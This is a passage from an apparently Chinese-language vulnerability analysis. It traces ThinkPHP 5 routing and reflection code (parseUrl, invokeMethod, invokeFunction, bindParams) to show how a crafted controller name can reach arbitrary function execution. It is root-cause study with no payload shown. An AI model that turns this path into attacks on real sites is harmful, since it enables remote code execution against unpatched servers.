class="line"></span><br></pre></td></tr></table></figure>

<h3 id="invokeMethod"><a href="#invokeMethod" class="headerlink" title="invokeMethod()"></a>invokeMethod()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeMethod</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$vars</span> = []</span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$method</span>)) &#123;  </span><br><span class="line">        <span class="variable">$class</span>   = <span class="title function_ invoke__">is_object</span>(<span class="variable">$method</span>[<span class="number">0</span>]) ? <span class="variable">$method</span>[<span class="number">0</span>] : <span class="built_in">self</span>::<span class="title function_ invoke__">invokeClass</span>(<span class="variable">$method</span>[<span class="number">0</span>]);  </span><br><span class="line">        <span class="variable">$reflect</span> = <span class="keyword">new</span> <span class="title class_">\ReflectionMethod</span>(<span class="variable">$class</span>, <span class="variable">$method</span>[<span class="number">1</span>]);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">// 静态方法  </span></span><br><span class="line">        <span class="variable">$reflect</span> = <span class="keyword">new</span> <span class="title class_">\ReflectionMethod</span>(<span class="variable">$method</span>);  <span class="comment">//反射任意类</span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="variable">$args</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">bindParams</span>(<span class="variable">$reflect</span>, <span class="variable">$vars</span>);  <span class="comment">//绑定参数</span></span><br><span class="line">  </span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$debug</span> &amp;&amp; <span class="title class_">Log</span>::<span class="title function_ invoke__">record</span>(<span class="string">&#x27;[ RUN ] &#x27;</span> . <span class="variable">$reflect</span>-&gt;<span class="keyword">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$reflect</span>-&gt;name . <span class="string">&#x27;[ &#x27;</span> . <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">getFileName</span>() . <span class="string">&#x27; ]&#x27;</span>, <span class="string">&#x27;info&#x27;</span>); <span class="comment">//记录调试信息 </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>) ? <span class="variable">$class</span> : <span class="literal">null</span>, <span class="variable">$args</span>);  <span class="comment">//实例化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里注意到$method确实是从 module 传进来的 $call 数组，<br>最初 $dispatch[‘module’] 变成了 module()函数中的 $result ，再通过 explode分割模块然后通过 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$actionName</span> = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$result</span>[<span class="number">2</span>] ?: <span class="variable">$config</span>[<span class="string">&#x27;default_action&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>赋值给$actionName<br>再通过这里 <code>$action = $actionName . $config[&#39;action_suffix&#39;];</code><br>赋值给 $action</p>
<p>最后通过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>([<span class="variable">$instance</span>, <span class="variable">$action</span>])) &#123;  </span><br><span class="line">    <span class="comment">// 执行操作方法  </span></span><br><span class="line">    <span class="variable">$call</span> = [<span class="variable">$instance</span>, <span class="variable">$action</span>];  </span><br><span class="line">    <span class="comment">// 严格获取当前操作方法名  </span></span><br><span class="line">    <span class="variable">$reflect</span>    = <span class="keyword">new</span> <span class="title class_">\ReflectionMethod</span>(<span class="variable">$instance</span>, <span class="variable">$action</span>);  </span><br><span class="line">    <span class="variable">$methodName</span> = <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">getName</span>();  </span><br><span class="line">    <span class="variable">$suffix</span>     = <span class="variable">$config</span>[<span class="string">&#x27;action_suffix&#x27;</span>];  </span><br><span class="line">    <span class="variable">$actionName</span> = <span class="variable">$suffix</span> ? <span class="title function_ invoke__">substr</span>(<span class="variable">$methodName</span>, <span class="number">0</span>, -<span class="title function_ invoke__">strlen</span>(<span class="variable">$suffix</span>)) : <span class="variable">$methodName</span>;  </span><br><span class="line">    <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">action</span>(<span class="variable">$actionName</span>);</span><br></pre></td></tr></table></figure>

<p>赋值给$call<br>所以只要传入的模块为 invokeFunction()，那么接下来就能调用这个函数来执行命令了</p>
<h3 id="invokeFunction"><a href="#invokeFunction" class="headerlink" title="invokeFunction()"></a>invokeFunction()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeFunction</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$vars</span> = []</span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$reflect</span> = <span class="keyword">new</span> <span class="title class_">\ReflectionFunction</span>(<span class="variable">$function</span>);  </span><br><span class="line">    <span class="variable">$args</span>    = <span class="built_in">self</span>::<span class="title function_ invoke__">bindParams</span>(<span class="variable">$reflect</span>, <span class="variable">$vars</span>);  <span class="comment">//参数绑定</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 记录执行信息  </span></span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$debug</span> &amp;&amp; <span class="title class_">Log</span>::<span class="title function_ invoke__">record</span>(<span class="string">&#x27;[ RUN ] &#x27;</span> . <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">__toString</span>(), <span class="string">&#x27;info&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="variable">$args</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>return $reflect-&gt;invokeArgs($args);</code> 这一步完成了命令执行</p>
<h3 id="bindParams"><a href="#bindParams" class="headerlink" title="bindParams()"></a>bindParams()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">bindParams</span>(<span class="params"><span class="variable">$reflect</span>, <span class="variable">$vars</span> = []</span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="comment">// 自动获取请求变量  </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$vars</span>)) &#123;  </span><br><span class="line">        <span class="variable">$vars</span> = <span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;url_param_type&#x27;</span>) ?  </span><br><span class="line">        <span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>()-&gt;<span class="title function_ invoke__">route</span>() :      <span class="comment">//路由参数</span></span><br><span class="line">        <span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>()-&gt;<span class="title function_ invoke__">param</span>();       <span class="comment">//所有请求参数</span></span><br><span class="line">    &#125;  </span><br><span class="line">	  <span class="comment">//绑定参数</span></span><br><span class="line">    <span class="variable">$args</span> = [];  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">getNumberOfParameters</span>() &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="comment">// 判断数组类型 数字数组时按顺序绑定参数  </span></span><br><span class="line">        <span class="title function_ invoke__">reset</span>(<span class="variable">$vars</span>);  </span><br><span class="line">        <span class="variable">$type</span> = <span class="title function_ invoke__">key</span>(<span class="variable">$vars</span>) === <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>;  </span><br><span class="line">		  <span class="comment">//循环绑定参数</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">getParameters</span>() <span class="keyword">as</span> <span class="variable">$param</span>) &#123;  </span><br><span class="line">            <span class="variable">$args</span>[] = <span class="built_in">self</span>::<span class="title function_ invoke__">getParamValue</span>(<span class="variable">$param</span>, <span class="variable">$vars</span>, <span class="variable">$type</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$args</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="getParmaValue"><a href="#getParmaValue" class="headerlink" title="getParmaValue()"></a>getParmaValue()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getParamValue</span>(<span class="params"><span class="variable">$param</span>, &amp;<span class="variable">$vars</span>, <span class="variable">$type</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$name</span>  = <span class="variable">$param</span>-&gt;<span class="title function_ invoke__">getName</span>();  </span><br><span class="line">    <span class="variable">$class</span> = <span class="variable">$param</span>-&gt;<span class="title function_ invoke__">getClass</span>();  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$class</span>) &#123;  </span><br><span class="line">        <span class="variable">$className</span> = <span class="variable">$class</span>-&gt;<span class="title function_ invoke__">getName</span>();  </span><br><span class="line">        <span class="variable">$bind</span>      = <span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>()-&gt;<span class="variable">$name</span>;  <span class="comment">//从请求中获取同名属性</span></span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$bind</span> <span class="keyword">instanceof</span> <span class="variable">$className</span>) &#123;  </span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$bind</span>;  <span class="comment">//直接使用请求中的对象</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$className</span>, <span class="string">&#x27;invoke&#x27;</span>)) &#123;  </span><br><span class="line">                <span class="variable">$method</span> = <span class="keyword">new</span> <span class="title class_">\ReflectionMethod</span>(<span class="variable">$className</span>, <span class="string">&#x27;invoke&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$method</span>-&gt;<span class="title function_ invoke__">isPublic</span>() &amp;&amp; <span class="variable">$method</span>-&gt;<span class="title function_ invoke__">isStatic</span>()) &#123;  </span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$className</span>::<span class="title function_ invoke__">invoke</span>(<span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>());  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">method_exists</span>(<span class="variable">$className</span>, <span class="string">&#x27;instance&#x27;</span>) ?  </span><br><span class="line">            <span class="variable">$className</span>::<span class="title function_ invoke__">instance</span>() :  </span><br><span class="line">            <span class="keyword">new</span> <span class="variable">$className</span>;  <span class="comment">//实例化</span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="number">1</span> == <span class="variable">$type</span> &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$vars</span>)) &#123;  </span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">array_shift</span>(<span class="variable">$vars</span>);  <span class="comment">//数字数组</span></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="number">0</span> == <span class="variable">$type</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$vars</span>[<span class="variable">$name</span>])) &#123;  </span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$vars</span>[<span class="variable">$name</span>];  <span class="comment">//关联数组</span></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$param</span>-&gt;<span class="title function_ invoke__">isDefaultValueAvailable</span>()) &#123;  </span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$param</span>-&gt;<span class="title function_ invoke__">getDefaultValue</span>();  <span class="comment">//使用默认值</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\InvalidArgumentException</span>(<span class="string">&#x27;method param miss:&#x27;</span> . <span class="variable">$name</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过 PHP 的反射机制来分析目标参数，然后获取对应的参数值</p>
<h2 id="路由解析"><a href="#路由解析" class="headerlink" title="路由解析"></a>路由解析</h2><p>值是如何在这里面传输的过程了解清楚了，现在需要去了解 <code>$dispatch</code> 是怎么传入进来的<br>在 run()函数中调用了exec()函数</p>
<h3 id="run"><a href="#run" class="headerlink" title="run()"></a>run()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//run()</span></span><br><span class="line"><span class="title class_">Hook</span>::<span class="title function_ invoke__">listen</span>(<span class="string">&#x27;app_dispatch&#x27;</span>, <span class="built_in">self</span>::<span class="variable">$dispatch</span>);  </span><br><span class="line"><span class="comment">// 获取应用调度信息  </span></span><br><span class="line"><span class="variable">$dispatch</span> = <span class="built_in">self</span>::<span class="variable">$dispatch</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 未设置调度信息则进行 URL 路由检测  </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$dispatch</span>)) &#123;  </span><br><span class="line">    <span class="variable">$dispatch</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">routeCheck</span>(<span class="variable">$request</span>, <span class="variable">$config</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果 <code>$dispatch</code> 为空的话会去调用 <code>self::routeCheck()</code> </p>
<h3 id="routeCheck"><a href="#routeCheck" class="headerlink" title="routeCheck()"></a>routeCheck()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 尝试路由匹配</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title class_">Route</span>::<span class="title function_ invoke__">check</span>(<span class="variable">$request</span>, <span class="variable">$path</span>, <span class="variable">$depr</span>, <span class="variable">$config</span>[<span class="string">&#x27;url_domain_deploy&#x27;</span>]);</span><br><span class="line"><span class="comment">// 2. 如果强制路由且匹配失败，抛出异常</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$must</span> &amp;&amp; <span class="literal">false</span> === <span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="comment">// 路由无效</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RouteNotFoundException</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 3. 如果路由匹配失败（非强制路由），进行默认URL解析</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title class_">Route</span>::<span class="title function_ invoke__">parseUrl</span>(<span class="variable">$path</span>, <span class="variable">$depr</span>, <span class="variable">$config</span>[<span class="string">&#x27;controller_auto_search&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 4. 返回结果</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure>

<p>一般都是会进行默认的 URL 解析，所以会接着去调用 <code>Route::parseUrl</code> </p>
<h3 id="Route-parseUrl"><a href="#Route-parseUrl" class="headerlink" title="Route::parseUrl"></a>Route::parseUrl</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$depr</span> = <span class="string">&#x27;/&#x27;</span>, <span class="variable">$autoSearch</span> = <span class="literal">false</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$bind</span>[<span class="string">&#x27;module&#x27;</span>])) &#123;  <span class="comment">//重点关注模块是否可控</span></span><br><span class="line">        <span class="variable">$bind</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$depr</span>, <span class="built_in">self</span>::<span class="variable">$bind</span>[<span class="string">&#x27;module&#x27;</span>]);  <span class="comment">//统一分隔符</span></span><br><span class="line">        <span class="comment">// 如果有模块/控制器绑定  </span></span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$bind</span> . (<span class="string">&#x27;.&#x27;</span> != <span class="title function_ invoke__">substr</span>(<span class="variable">$bind</span>, -<span class="number">1</span>) ? <span class="variable">$depr</span> : <span class="string">&#x27;&#x27;</span>) . <span class="title function_ invoke__">ltrim</span>(<span class="variable">$url</span>, <span class="variable">$depr</span>);  </span><br><span class="line">    &#125;  <span class="comment">//将模块与 url 进行拼接</span></span><br><span class="line">    <span class="variable">$url</span>              = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$depr</span>, <span class="string">&#x27;|&#x27;</span>, <span class="variable">$url</span>);  </span><br><span class="line">    <span class="comment">//将分隔符替换为 | 但是未能过滤 \</span></span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$path</span>, <span class="variable">$var</span>) = <span class="built_in">self</span>::<span class="title function_ invoke__">parseUrlPath</span>(<span class="variable">$url</span>);  <span class="comment">//分割路径和参数</span></span><br><span class="line">    <span class="variable">$route</span>            = [<span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>];  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$path</span>)) &#123;  </span><br><span class="line">        <span class="comment">// 解析模块  </span></span><br><span class="line">        <span class="variable">$module</span> = <span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;app_multi_module&#x27;</span>) ? <span class="title function_ invoke__">array_shift</span>(<span class="variable">$path</span>) : <span class="literal">null</span>;  </span><br><span class="line">        <span class="comment">//如果没有开启多模块，$module会说 null</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$autoSearch</span>) &#123;  </span><br><span class="line">            <span class="comment">// 自动搜索控制器  </span></span><br><span class="line">            <span class="variable">$dir</span>    = APP_PATH . (<span class="variable">$module</span> ? <span class="variable">$module</span> . DS : <span class="string">&#x27;&#x27;</span>) . <span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;url_controller_layer&#x27;</span>);  </span><br><span class="line">            <span class="variable">$suffix</span> = <span class="title class_">App</span>::<span class="variable">$suffix</span> || <span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;controller_suffix&#x27;</span>) ? <span class="title function_ invoke__">ucfirst</span>(<span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;url_controller_layer&#x27;</span>)) : <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">            <span class="variable">$item</span>   = [];  </span><br><span class="line">            <span class="variable">$find</span>   = <span class="literal">false</span>;  </span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$path</span> <span class="keyword">as</span> <span class="variable">$val</span>) &#123;  </span><br><span class="line">                <span class="variable">$item</span>[] = <span class="variable">$val</span>;  </span><br><span class="line">                <span class="variable">$file</span>   = <span class="variable">$dir</span> . DS . <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>, DS, <span class="variable">$val</span>) . <span class="variable">$suffix</span> . EXT;  </span><br><span class="line">                <span class="variable">$file</span>   = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>, PATHINFO_DIRNAME) . DS . <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>, PATHINFO_FILENAME), <span class="number">1</span>) . EXT;  </span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;  </span><br><span class="line">                    <span class="variable">$find</span> = <span class="literal">true</span>;  </span><br><span class="line">                    <span class="keyword">break</span>;  </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                    <span class="variable">$dir</span> .= DS . <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$val</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$find</span>) &#123;  </span><br><span class="line">                <span class="variable">$controller</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$item</span>);  </span><br><span class="line">                <span class="variable">$path</span>       = <span class="title function_ invoke__">array_slice</span>(<span class="variable">$path</span>, <span class="title function_ invoke__">count</span>(<span class="variable">$item</span>));  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="variable">$controller</span> = <span class="title function_ invoke__">array_shift</span>(<span class="variable">$path</span>);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  <span class="comment">//因为默认$autoSearch = false，所以走分支</span></span><br><span class="line">            <span class="comment">// 解析控制器  </span></span><br><span class="line">            <span class="variable">$controller</span> = !<span class="keyword">empty</span>(<span class="variable">$path</span>) ? <span class="title function_ invoke__">array_shift</span>(<span class="variable">$path</span>) : <span class="literal">null</span>; </span><br><span class="line">            <span class="comment">//从 $path 中获取第一个元素作为控制器 </span></span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="comment">// 解析操作  再次获取作为操作名</span></span><br><span class="line">        <span class="variable">$action</span> = !<span class="keyword">empty</span>(<span class="variable">$path</span>) ? <span class="title function_ invoke__">array_shift</span>(<span class="variable">$path</span>) : <span class="literal">null</span>;  </span><br><span class="line">        <span class="comment">// 解析额外参数  </span></span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">parseUrlParams</span>(<span class="keyword">empty</span>(<span class="variable">$path</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$path</span>));  </span><br><span class="line">        <span class="comment">// 封装路由  </span></span><br><span class="line">        <span class="variable">$route</span> = [<span class="variable">$module</span>, <span class="variable">$controller</span>, <span class="variable">$action</span>];  </span><br><span class="line">        <span class="comment">// 检查地址是否被定义过路由  </span></span><br><span class="line">        <span class="variable">$name</span>  = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$module</span> . <span class="string">&#x27;/&#x27;</span> . <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$controller</span>, <span class="number">1</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$action</span>);  </span><br><span class="line">        <span class="variable">$name2</span> = <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$module</span>) || <span class="keyword">isset</span>(<span class="variable">$bind</span>) &amp;&amp; <span class="variable">$module</span> == <span class="variable">$bind</span>) &#123;  </span><br><span class="line">            <span class="variable">$name2</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$controller</span>, <span class="number">1</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$action</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">		  <span class="comment">//检查路由</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$rules</span>[<span class="string">&#x27;name&#x27;</span>][<span class="variable">$name</span>]) || <span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$rules</span>[<span class="string">&#x27;name&#x27;</span>][<span class="variable">$name2</span>])) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">HttpException</span>(<span class="number">404</span>, <span class="string">&#x27;invalid request:&#x27;</span> . <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$depr</span>, <span class="variable">$url</span>));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;type&#x27;</span> =&gt; <span class="string">&#x27;module&#x27;</span>, <span class="string">&#x27;module&#x27;</span> =&gt; <span class="variable">$route</span>];  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个代码中将控制器转换为驼峰命名，Loader::parseName($controller, 1)解析控制器</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span>  = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$module</span> . <span class="string">&#x27;/&#x27;</span> . <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$controller</span>, <span class="number">1</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$action</span>);</span><br></pre></td></tr></table></figure>

<p>跟进 parseName()，若控制器名包含 <code>\</code>  看函数会怎么处理</p>
